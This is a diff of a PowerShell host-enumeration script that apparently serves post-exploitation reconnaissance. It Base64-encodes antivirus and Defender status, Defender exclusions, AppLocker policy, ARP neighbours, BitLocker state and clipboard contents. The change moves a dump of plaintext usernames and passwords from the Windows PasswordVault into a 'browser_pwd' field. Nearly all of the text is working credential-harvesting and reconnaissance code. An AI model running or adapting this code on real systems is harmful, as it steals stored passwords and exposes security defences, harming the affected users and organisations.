@@ -4,7 +4,7 @@ function Encode64{
 param($Text);if($null -eq $Text){return "IA=="}else{$Bytes=[System.Text.Encoding]::Unicode.GetBytes($Text);$EncodedText=[Convert]::ToBase64String($Bytes);return $EncodedText}
 };
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];
-$vault = New-Object Windows.Security.Credentials.PasswordVault;$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string;
+$vault = New-Object Windows.Security.Credentials.PasswordVault;
 
 function iis_sites_function{try {return Get-IISSite | out-string}catch {return ""}}
 function wsus_clients_function{try {return Get-WsusComputer -All | out-string}catch {return ""}}
@@ -18,7 +18,7 @@ antivirus = Encode64(Get-Service | Where-Object { $_.DisplayName -like "*McAfee*
 applocker = Encode64(Get-AppLockerPolicy -Effective -Xml | out-string);
 arp = Encode64(Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State | out-string);
 bitlocker = Encode64(Get-BitLockerVolume | out-string);
-browser_pwd = Encode64($vault);
+browser_pwd = Encode64($vault.RetrieveAll() | % { $_.RetrievePassword();$_ } | select username,resource,password | out-string);
 clipboard = Encode64(Get-Clipboard | out-string);
 defender_exclusions = Encode64(Get-MpPreference | select Exclusion* | fl | out-string);
 defender_status = Encode64(Get-MpComputerStatus | out-string);
